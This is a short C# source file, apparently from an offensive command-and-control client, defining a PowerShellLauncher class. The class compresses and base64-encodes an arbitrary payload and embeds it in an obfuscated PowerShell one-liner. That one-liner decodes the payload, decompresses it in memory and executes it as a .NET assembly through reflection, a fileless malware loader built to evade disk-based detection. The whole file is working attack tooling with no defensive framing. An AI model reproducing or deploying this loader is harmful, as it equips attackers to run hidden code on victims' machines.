using Shared.Utilities;

using System;

namespace Client.Models
{
    class PowerShellLauncher
    {
        static readonly string Template = @"sv d ([System.Convert]::FromBase64String('{{COMPRESSED}}'));sv i (New-Object System.IO.MemoryStream(,(gv d).Value));sv o (New-Object System.IO.MemoryStream);sv g (New-Object System.IO.Compression.GzipStream (gv i).Value,([IO.Compression.CompressionMode]::Decompress));((gv g).Value).CopyTo((gv o).Value);[System.Reflection.Assembly]::Load(((gv o).Value).ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))";

        public static string GenerateLauncher(byte[] payload)
        {
            var compressed = Convert.ToBase64String(Utilities.Compress(payload));
            var launcher = Template.Replace("{{COMPRESSED}}", compressed);
            return launcher;
        }
    }
}